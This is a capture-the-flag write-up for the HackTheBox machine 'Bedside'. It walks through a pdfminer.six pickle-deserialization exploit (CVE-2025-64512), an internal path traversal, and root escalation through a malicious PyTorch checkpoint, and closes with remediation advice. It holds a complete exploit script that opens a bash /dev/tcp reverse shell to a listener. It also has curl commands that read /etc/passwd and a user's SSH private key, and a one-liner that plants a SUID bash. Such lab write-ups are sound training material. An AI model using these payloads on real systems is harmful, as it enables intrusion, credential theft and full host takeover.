---
title: Bedside
machineName: Bedside
os: linux
difficulty: medium
season: Season 11
tags:
  - pdfminer.six
  - CVE-2025-64512
  - Pickle Deserialization
  - CMap Path Traversal
  - IPv6 Internal Enumeration
  - Chisel Tunneling
  - Path Traversal
  - MONAI
  - PyTorch CheckpointLoader
  - SUID Bash
  - Privilege Escalation
date: '2026-07-18'
pointsAwarded: 30
machineIP: '10.129.68.230'
summary: '---'
---

# 🛡️ HTB - Bedside (Medium)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Medium Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** Bedside
- **Operating System:** Linux (Debian)
- **Difficulty:** Medium
- **Date of Scan:** 2026-07-25
- **Vulnerabilities:** pdfminer.six CMap Path Traversal Pickle Deserialization RCE (CVE-2025-64512), Internal IPv6 Dev Server Path Traversal, MONAI PyTorch CheckpointLoader Insecure Deserialization SUID Escalation

---

## Step 1 - Reconnaissance

Will Use Nmap To See what Ports and Services are Open:

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.68.230
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-25 14:08 UTC
Nmap scan report for 10.129.68.230
Host is up (0.26s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp   open     http    Apache httpd 2.4.68
|_http-title: Did not follow redirect to http://bedside.htb/
|_http-server-header: Apache/2.4.68 (Debian)
3000/tcp filtered ppp
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
Network Distance: 2 hops
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   252.59 ms 10.10.14.1
2   254.88 ms 10.129.68.230

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.46 seconds
```

### Web Service & Subdomain Discovery (research.bedside.htb)

- 🔍 *An extra filtered port 3000! It should be internally open.*
- 🔍 *Let's try looking at the web service:*

![Bedside Web Portal](images/bedside/n1.png)

- 🔍 *Well, I found nothing interesting out there, except this basic info:*

![Bedside Portal Information](images/bedside/n2.png)

- 🔍 *Let's try to look for subdirectories and subdomains:*

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://bedside.htb -H "Host: FUZZ.bedside.htb" -ac -t 100
```

- 🔍 *Luckily found a subdomain. Let's add it to our hosts file real quick and see what it has for us:*

```text
research                [Status: 200, Size: 3152, Words: 313, Lines: 80, Duration: 633ms]
```

![Bedside Research Portal](images/bedside/n3.png)

- 🔍 *While looking at this web page, it seems like research about medical images and data.*
- 🔍 *It also has a note written which says:*

```text
Important Notice: Please only upload files in the accepted formats: jpeg, jpg, png, bmp, tiff, dcm, pdf. Unauthorized access or misuse of this portal is strictly prohibited.

Collections can be uploaded as archives.
```

- 🔍 *That concludes data can be uploaded in archive format, processing jpeg, jpg, png, bmp, tiff, dcm, and pdf image formats.*
- 🔍 *Let's try uploading a file and intercepting the request via Burp Suite to see exactly what happens to these files after uploading:*

![Burp Suite Upload Intercept](images/bedside/n4.png)

### pdfminer.six CMap Deserialization Flaw (CVE-2025-64512)

- 🔍 *When we closely look at the response header, we see it uses `pdfminer.six` to process these PDF files!*
- 🔍 *What is pdfminer? `pdfminer.six` is an open-source Python library used to extract text, layout details, and coordinates from PDF files. It is an updated, community-maintained version of the original PDFMiner tool that adds full support for modern Python 3 environments.*
- 🔍 *While looking for open vulnerabilities for pdfminer, I found CVE-2025-64512:*

```text
CVE-2025-64512: The CMapDB._load_data() function uses Python's pickle.loads() to read font map files (.pickle.gz) without proper safety checks.
```

- 🔍 *To render text correctly, PDFs use "Character Maps" (CMaps) that map character codes to actual glyphs. `pdfminer.six` stores safe, pre-built CMap data as `.pickle.gz` files in its internal `cmap/` directory.*
- 🔍 *The vulnerability exists in the `CMapDB._load_data()` function. When the library encounters a CMap reference in a PDF, it constructs a file path and uses Python’s `pickle.loads()` to deserialize it.*
- 🔍 *The fatal flaw is that the library trusts the filename specified inside the PDF. It only checks that the filename ends with `.pickle.gz`, but it does not prevent Path Traversal or Absolute Paths.*

```python
# Simplified vulnerable logic from pdfminer.six
def _load_data(cls, name: str) -> Any:
    name = name.replace("\0", "")  # Insufficient sanitization
    filename = "%s.pickle.gz" % name # Attacker controls 'name'
    path = os.path.join(directory, filename) # If 'name' is absolute, 'directory' is ignored!

    # Deserializing untrusted data from an attacker-controlled path
    return type(str(name), (), pickle.loads(gzfile.read()))
```

- 🔍 *When `pdfminer.six` extracts text from a PDF, it needs to map character codes to actual readable characters using CMaps. To improve performance, `pdfminer.six` pre-compiles these CMaps and stores them as `.pickle.gz` (gzipped Python pickle) files in its internal directory.*
- 🔍 *Exploit vector: The fatal flaw is that the `name` variable is controlled by the attacker via the PDF's `/Encoding` dictionary. If the library does not strictly validate that `name` is a safe, relative path, an attacker can provide an absolute path (e.g., `/tmp/malicious`).*
- 🔍 *Because of how `os.path.join` works in Python, if the second argument is an absolute path, it completely ignores the first argument (`directory`). The library will happily open `/tmp/malicious.pickle.gz` and pass it to `pickle.loads()`.*
- 🔍 *Why Pickle is Dangerous: Python's `pickle` module is not secure for untrusted data. When `pickle.loads()` reads a file, it looks for the `__reduce__` magic method on any object. If found, it executes the return value of `__reduce__` as code. This is the bridge from "loading a file" to "Remote Code Execution."*
- 🔍 *As we don't have shell access to write the `pickle.gz` file, the web upload vector is our only way to upload this file. We can't upload to a random directory, or it would throw a file-not-found error because we don't know where uploads land.*
- 🔍 *For now, let's create a PDF file with a temporary file reference to test:*

```text
5 0 obj
<<
/Type /Font
/Subtype /Type0
/BaseFont /MaliciousFont
/Encoding /#2Ftmp#2Fmalicious  <-- Points to /tmp/malicious.pickle.gz
>>
endobj
```

- 🔍 *Now let's upload this file via the web:*

![Upload Error Response](images/bedside/n4.png)

- 🔍 *It throws an error: `MIME type mismatch. Unable to upload file to destination /var/www/research.bedside.htb/uploads`. That properly explains what happens if we use a PDF with a different path reference! By doing this, we also got the absolute path where uploads land on the server: `/var/www/research.bedside.htb/uploads`!*

---

## Step 2 - Initial Foothold

### Malicious CMap PDF Generation & Reverse Shell (worked.py)

- 🔍 *We need to create a `__reduce__` method payload and convert it into pickle gzip format.*
- 🔍 *Then we also need to create a `.pdf` file with CMap character references to trigger `pickle.loads()` to deserialize it.*
- 🔍 *As soon as the `pickle.loads()` function executes `__reduce__`, we get code execution on the server. Let's create an exploit script:*

```python
import argparse
import gzip
import os
import pickle
import requests

def build_pickle(lhost, lport, out_path):
    class RCE:
        def __reduce__(self):  # the load function specifically looks for __reduce__ method.
            cmd = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
            return (os.system, (cmd,))  # Executed when the load function deserializes the gzip.

    with gzip.open(out_path, "wb") as f:
        pickle.dump(RCE(), f)

def encode_pdf_name(path):
    out = ""
    for ch in path:
        if ch.isalnum() or ch in ".-_":
            out += ch
        else:
            out += "#%02X" % ord(ch) # Hex encoding needed to avoid PDF string syntax errors
    return out

def build_pdf(encoding_name):
    return f"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 5 0 R>>>>>>endobj
4 0 obj<</Length 44>>stream
BT /F1 12 Tf 100 700 Td (x) Tj ET
endstream endobj
5 0 obj<</Type/Font/Subtype/Type0/BaseFont/F-Identity-H/Encoding/{encoding_name}/DescendantFonts[6 0 R]>>endobj
6 0 obj<</Type/Font/Subtype/CIDFontType2/BaseFont/F/CIDSystemInfo<</Registry(Adobe)/Ordering(Identity)/Supplement 0>>/FontDescriptor 7 0 R>>endobj
7 0 obj<</Type/FontDescriptor/FontName/F/Flags 4/FontBBox[-1000 -1000 1000 1000]/ItalicAngle 0/Ascent 1000/Descent -200/CapHeight 800/StemV 80>>endobj
xref
0 8
0000000000 65535 f
trailer<</Size 8/Root 1 0 R>>
startxref
0
%%EOF"""

def upload(target, filename, data):
    r = requests.post(target.rstrip("/") + "/", files={"uploadFile": (filename, data)}, timeout=15)
    return "uploaded successfully" in r.text, r

def main():
    ap = argparse.ArgumentParser(description="CVE-2025-64512 pdfminer.six pickle RCE PoC")
    ap.add_argument("-t", "--target-url", required=True,
                    help="Base URL of the vulnerable upload portal, e.g. http://research.bedside.htb")
    ap.add_argument("-H", "--lhost", required=True, help="Listener IP for the reverse shell")
    ap.add_argument("-p", "--lport", required=True, type=int, help="Listener port for the reverse shell")
    ap.add_argument("--upload-path", default="/var/www/research.bedside.htb/uploads",
                    help="Server-side path the portal saves uploads to")
    ap.add_argument("--pickle-name", default="payload", help="Base filename for the uploaded pickle")
    args = ap.parse_args()

    pickle_file = f"{args.pickle_name}.pickle.gz"
    build_pickle(args.lhost, args.lport, pickle_file)
    print(f"[*] built {pickle_file}")

    ok, _ = upload(args.target_url, pickle_file, open(pickle_file, "rb"))
    if not ok:
        print("[-] pickle upload failed/rejected")
        return
    print(f"[+] uploaded {pickle_file}")

    cmap_target = f"{args.upload_path.rstrip('/')}/{args.pickle_name}"
    encoded_name = encode_pdf_name(cmap_target)
    pdf_data = build_pdf(encoded_name)

    ok, _ = upload(args.target_url, "trigger.pdf", pdf_data)
    if not ok:
        print("[-] pdf upload failed/rejected")
        return
    print("[+] uploaded trigger.pdf")
    print(f"[*] start a listener now if you haven't: nc -lvnp {args.lport}")
    print("[*] the backend polls periodically - wait a bit for the shell")

if __name__ == "__main__":
    main()
```

- 🔍 *Breaking down the script:*
  - `build_pickle()`: Builds the pickle payload containing our reverse shell command and compresses it into a gzip archive.
  - `encode_pdf_name()`: Hex-encodes the server path since the `/Encoding` object starts with `/` and cannot contain raw slashes or dots.
  - `build_pdf()`: Generates the PDF structure. Object `5 0 obj` defines the Font pointing to our hex-encoded absolute path.
  - `upload()`: Transmits the payload and trigger files to the portal.
- 🔍 *When both files are uploaded, the server parses the PDF, reads the `/Encoding` path `/var/www/research.bedside.htb/uploads/payload`, appends `.pickle.gz`, and deserializes it via `pickle.loads()`, triggering our reverse shell command.*
- 🔍 *Let's execute the script and catch the shell:*

```bash
python3 worked.py --target http://research.bedside.htb/ -H 10.10.15.169 --lport 4545
```

```text
[*] built payload.pickle.gz
[+] uploaded payload.pickle.gz
[+] uploaded trigger.pdf
[*] start a listener now if you haven't: nc -lvnp 4545
[*] the backend polls periodically - wait a bit for the shell
```

### Shell Capture as datawrangler

- 🔍 *On the listener:*

```bash
nc -lvnp 4545
```

```text
listening on [any] 4545 ...
connect to [10.10.15.169] from (UNKNOWN) [10.129.68.230] 48186
datawrangler@data-wrangler:/app$ id
uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)
```

- 🔍 *Foothold granted! We have a low-privileged shell as `datawrangler`.*

---

## Step 3 - Lateral Movement to Developer

### IPv6 Internal Port 3000 Discovery & Chisel Tunneling

- 🔍 *Now, in the beginning, the Nmap report identified a filtered port at 3000.*
- 🔍 *Since the container environment is stripped and lacks standard network binaries (`netstat`, `ss`), we inspect the `/proc` filesystem:*

```bash
datawrangler@data-wrangler:/app$ cat /proc/net/tcp
```

```text
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   0: 0100007F:9CE1 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 12704 1 00000000ef0224ea 100 0 0 10 0     # 40161 (decimal)               
   1: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 11848 1 00000000d121fe31 100 0 0 10 0     # 80 (HTTP)                
   2: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 11822 1 00000000b777bc86 100 0 0 10 0     # 22 (SSH)               
```

- 🔍 *Port 3000 in hex is `0BB8`, which does not appear in `/proc/net/tcp`. This means port 3000 is either listening on IPv6 or not running at all!*
- 🔍 *Let's grep for `0BB8` in `/proc/net/tcp6`:*

```bash
datawrangler@data-wrangler:/app$ cat /proc/net/tcp6 | grep ':0BB8'
```

```text
   1: 00000000000000000000000000000000:0BB8 00000000000000000000000000000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 11831 1 00000000c467be95 100 0 0 10 0
```

- 🔍 *Port 3000 is listening on IPv6! Let's forward it using Chisel:*

```bash
# On attacker machine:
./chisel server -p 8080 --reverse

# On target container:
./chisel client 10.10.15.169:8080 R:3000:127.0.0.1:3000
```

- 🔍 *Now browsing to `http://localhost:3000`:*

![Bedside Clinic Image Viewer](images/bedside/n6.png)

### Dev Server Path Traversal & Developer SSH Key Extraction

- 🔍 *Analyzing the source code reveals four major clues:*
  1. **Simulated Data Comment**: Frontend contains `// Simulate fetching multi-slice MRI + mask data`. In CTF challenges, "simulate" or "demo" indicates file-reading functionality exists in the real backend implementation.
  2. **Dev Server Artifacts**: Found `/@hmr` and `Built with esm.sh/x` console logs. Development servers often implement naive `path.join()` file serving vulnerable to path traversal.
  3. **Local Vendor Imports**: Serving static assets from `./vendor/` confirms dynamic static file-serving routing.
  4. **Domain Context**: Medical imaging platforms frequently read local files from datastores.
- 🔍 *Let's test Path Traversal using `curl` with `--path-as-is` to prevent client-side path normalization:*

```bash
curl -s "http://localhost:3000/../../../../etc/passwd" --path-as-is
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
datawrangler:x:988:1001::/home/datawrangler:/bin/sh
```

- 🔍 *Path traversal confirmed! Our target user on the host is `developer`.*
- 🔍 *Now let's steal developer's private SSH key:*

```bash
curl -s "http://localhost:3000/../../../../home/developer/.ssh/id_rsa" --path-as-is
```

```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs
SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA
AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

- 🔍 *Save the key to `id_rsa`, set permissions (`chmod 600 id_rsa`), and log in via SSH:*

```bash
ssh -i id_rsa developer@bedside.htb
```

```text
================================================================================
|                         BEDSIDE CLINIC NETWORK                               | 
|          Authorized Access Only. All activities are monitored.               |
================================================================================
Linux bedside 6.12.95+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.95-1 x86_64
developer@bedside:~$ id
uid=1000(developer) gid=1000(developer) groups=1000(developer),100(users)
```

- 🔍 *Access granted as user `developer`!*

---

## Step 4 - Privilege Escalation

### MONAI CheckpointLoader Sudoers Analysis

- 🔍 *Checking sudo privileges:*

```bash
developer@bedside:~$ sudo -l
```

```text
Matching Defaults entries for developer on bedside:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

- 🔍 *`developer` can run `/opt/trainer/bedside_trainer.py` as root without a password! Let's inspect the script:*

```python
# Key excerpt from /opt/trainer/bedside_trainer.py
from monai.handlers import CheckpointLoader

DATASTORE_ROOT = Path("/datastore")
CHECKPOINT_DIR = DATASTORE_ROOT / "checkpoints"
PROCESSED_DIR = DATASTORE_ROOT / "processed"
STAGING_DIR = DATASTORE_ROOT / "staging"

latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)
if latest_ckpt:
    loader = CheckpointLoader(
        load_path=str(latest_ckpt),
        load_dict={"model": model, "optimizer": optimizer},
        map_location=DEVICE
    )
    loader(engine)
```

- 🔍 *Under the hood, MONAI's `CheckpointLoader` uses PyTorch's `torch.load()`. By default, `torch.load()` uses Python's `pickle` module to deserialize `.pt` files, executing the `__reduce__` method upon loading.*
- 🔍 *However, there is an initial exit condition in `bedside_trainer.py`:*

```python
dataloader, n_data = prepare_dataloader_from_processed(PROCESSED_DIR, BATCH_SIZE)
if n_data == 0:
    logger.warning("No data available to train. Exiting.")
    return
```

- 🔍 *If `/datastore/processed/` is empty, the script exits before reaching `CheckpointLoader`!*
- 🔍 *Checking permissions on `/datastore`:*

```bash
developer@bedside:/$ ls -la /datastore
ls: cannot open directory '/datastore': Permission denied
```

### Datastore Pre-requisite Bypass via datawrangler

- 🔍 *`developer` has no read or write access to `/datastore`. But what about `datawrangler` inside the container?*

```bash
datawrangler@data-wrangler:/app$ ls -la /datastore
drwxrwx--- 8 datawrangler dataops  4096 Jul 13 13:00 .
drwxrwx--- 2 datawrangler dataops  4096 Jul 13 13:00 checkpoints
drwxrwx--- 2 datawrangler dataops  4096 Jul 13 13:00 processed
drwxrwx--- 2 datawrangler dataops 12288 Jul 26 14:46 staging
```

- 🔍 *`datawrangler` owns `/datastore`! This clarifies our entire attack chain:*
  1. As `datawrangler`, place a valid dummy PNG in `/datastore/processed/valid.png` to satisfy the initial data check.
  2. As `developer`, generate a malicious PyTorch checkpoint `.pt` file containing a `__reduce__` method that copies `/bin/bash` to `/usr/local/bin/rootbash` with SUID permissions (`chmod 4755`).
  3. Pack `root.pt` into `root.zip` and upload it via the web portal.
  4. As `datawrangler`, extract `root.pt` into `/datastore/checkpoints/root.pt`.
  5. Touch `/datastore/checkpoints/root.pt` so its timestamp is the newest.
  6. As `developer`, trigger `sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py`.

### Malicious PyTorch Checkpoint Execution & SUID Root Shell

- 🔍 *Step 1: Put a valid base64 1x1 PNG in `/datastore/processed/`:*

```bash
# On datawrangler's shell:
cat <<'EOF' | base64 -d > /datastore/processed/valid.png
iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAusB9WlHK4QAAAAASUVORK5CYII=
EOF
```

- 🔍 *Step 2: Craft the malicious checkpoint:*

```bash
# On developer's shell:
python3 -c 'import torch,os;E=type("E",(),{"__reduce__":lambda s:(os.system,("cp /bin/bash /usr/local/bin/rootbash;chmod 4755 /usr/local/bin/rootbash",))});torch.save(E(),"root.pt")'
```

- 🔍 *Step 3: Pack into archive and upload via the portal:*

```bash
# On developer's shell:
python3 -c "import zipfile;z=zipfile.ZipFile('root.zip','w');z.write('root.pt');z.close()"
curl -s -F 'uploadFile=@root.zip;type=application/zip' http://research.bedside.htb/ >/dev/null
```

- 🔍 *Step 4 & 5: Extract and update timestamp:*

```bash
# On datawrangler's shell:
python3 -c "import zipfile;zipfile.ZipFile('/var/www/research.bedside.htb/uploads/root.zip').extract('root.pt','/datastore/checkpoints')"
touch /datastore/checkpoints/root.pt
```

- 🔍 *Step 6: Trigger the trainer script with sudo:*

```bash
developer@bedside:~$ sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

```text
2026-07-26 16:40:02,620 | INFO | Device: cpu
2026-07-26 16:40:02,622 | INFO | Using 1 samples for training.
2026-07-26 16:40:03,052 | INFO | Auto-detected input features: 16384
2026-07-26 16:40:03,071 | INFO | Found checkpoint /datastore/checkpoints/root.pt, loading with CheckpointLoader (callable mode)...
```

- 🔍 *Now spawn the SUID root shell:*

```bash
developer@bedside:~$ /usr/local/bin/rootbash -p
```

```text
rootbash-5.2# id
uid=1000(developer) gid=1000(developer) euid=0(root) groups=1000(developer),100(users)
rootbash-5.2# cat /root/root.txt
```

- 🔍 *The `-p` flag preserves effective root privileges. Host completely compromised!*

---

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Security Assessment Blueprint**
> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the Bedside system. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.

### 🔴 Unsafe Pickle Deserialization in pdfminer.six (CVE-2025-64512)

> [!WARNING]
> **Vulnerability Profile:**
> The `pdfminer.six` library uses `pickle.loads()` to deserialize CMap font mapping files referenced via user-controlled PDF encoding dictionaries, allowing path traversal to attacker-uploaded pickle payloads.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Unauthenticated users uploading PDFs can trigger immediate arbitrary code execution inside the document processing service context.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Update `pdfminer.six` to a patched release where CMap filenames are validated strictly against an allowlist of built-in relative names.
> - **Remediation:** Avoid Python's native `pickle` format for asset caching; use safe serialization formats like JSON, MessagePack, or Protocol Buffers.
> - **Detection:** Inspect uploaded PDF objects for `/Encoding` dictionaries containing path traversal sequences or hex-encoded directory delimiters (`#2F`).

---

### 🔴 Path Traversal in Development Static File Server (Port 3000)

> [!WARNING]
> **Vulnerability Profile:**
> A development web server bound to IPv6 lacked path normalization and allowed client-side path traversal via `--path-as-is`.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Attackers can read arbitrary files across the host filesystem, including user SSH keys (`id_rsa`), configuration secrets, and system hashes.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Never run development servers (Vite, custom HMR daemons) in production environments.
> - **Remediation:** Enforce canonical path checking: verify `os.path.realpath(requested_path).startswith(safe_root_dir)`.

---

### 🟡 MONAI PyTorch Checkpoint Insecure Deserialization via Sudo

> [!WARNING]
> **Vulnerability Profile:**
> The `bedside_trainer.py` script was granted passwordless `sudo` execution while dynamically loading untrusted `.pt` checkpoint files via PyTorch `torch.load()`.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Because `torch.load()` invokes `pickle.loads()` by default, any user capable of writing to `/datastore/checkpoints` can execute code as `root`.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Enable `weights_only=True` in `torch.load()` or `CheckpointLoader` to restrict deserialization to pure tensor data and block arbitrary object instantiation.
> - **Remediation:** Restrict sudo privileges so scripts cannot read from shared or world-writable storage directories.
